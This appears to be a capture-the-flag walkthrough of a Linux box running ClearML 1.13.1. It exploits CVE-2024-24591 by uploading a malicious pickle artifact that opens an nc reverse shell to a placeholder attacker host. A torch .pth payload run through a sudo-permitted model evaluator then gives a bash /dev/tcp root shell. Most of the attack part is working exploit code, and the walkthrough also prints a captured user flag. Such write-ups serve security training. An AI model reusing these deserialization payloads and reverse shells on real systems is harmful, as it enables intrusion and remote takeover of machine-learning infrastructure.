### Enum
We get a redirect, so lets update our `/etc/hosts`
We brute subdomains and web directories, yielding this:![Image](/assets/Screenshot 2024-10-09 at 1.09.59 PM.png)
Also this:![Image](/assets/Screenshot 2024-10-09 at 1.33.09 PM.png)
Add everything to `/etc/hosts`
Visiting the link, we get a portal. Creating a user gives us access. ClearML is AI software. Rooting around tells us 1.13.1
CVE-2024-24591 ![Image](/assets/Screenshot 2024-10-09 at 1.15.38 PM.png)
Great explanation here: https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/
We'll need to install clearml with `pip install clearml`
Then, for configuration purposes, create new credentials on the site via settings, and paste into the terminal when prompted.![Image](/assets/Screenshot 2024-10-09 at 1.34.13 PM.png)
Now, we can move on to the python script in order to plant a malicious files on the user via the poisoned dataset with dir traversal
Code meandering we stumble on 'Black Swan', and we can see that it is a script tasked with processing JSON artifacts. We can abuse this functionality by uploading our pickle file and passing it through this function for arbitrary code execution.
```
import pickle  
import os  
from clearml import Task, Logger  
  
  
task = Task.init(project_name='Black Swan', task_name='REV shell', tags=["review"])  
  
  
  
class MaliciousCode:  
    def __reduce__(self):  
  
        cmd = (  
            "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker-ip attacker-port > /tmp/f"  
        )  
        return (os.system, (cmd,))  
  
  
malicious_object = MaliciousCode()  
pickle_filename = 'malicious_pickle.pkl'  
with open(pickle_filename, 'wb') as f:  
    pickle.dump(malicious_object, f)  
  
print("Malicious pickle file with reverse shell created.")  
  
  
task.upload_artifact(name='malicious_pickle', artifact_object=malicious_object, retries=2, wait_on_upload=True, extension_name=".pkl")  
  
print("Malicious pickle file uploaded as artifact.")
```
Run it ![Image](/assets/Screenshot 2024-10-09 at 1.54.22 PM.png)
Shell as jippity! Stabilize shell
sudo -l ![Image](/assets/Screenshot 2024-10-09 at 1.56.37 PM.png)
we'll play with that in a second. First, grab user flag, and notice ssh private key!
user:3f27bf4798adad24993c80ea10ec74d9
create file and chmod 400 to ssh back in
`vim rsa.key` paste. Make sure to include begin and end part
`chmod 400 rsa.key`
`ssh -i rsa.key jippity@10.10.11.19`

### Priv esc
remember the nopasswd? here we go. 
Lets create a py script that drops a malicious pth file so taht we can eecute
`vim evilpath.py` and use
```
import torch
import os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/9001 0>&1'",))

evil = Payload()
torch.save(evil, 'evil.pth')
```

then to run, `python3 evilpath.py` followed by `cp evil.pth /models && sudo /usr/bin/evaluate_model /models/evil.pth`. It should hang

Your listener set at 9001 should catch the root shell!
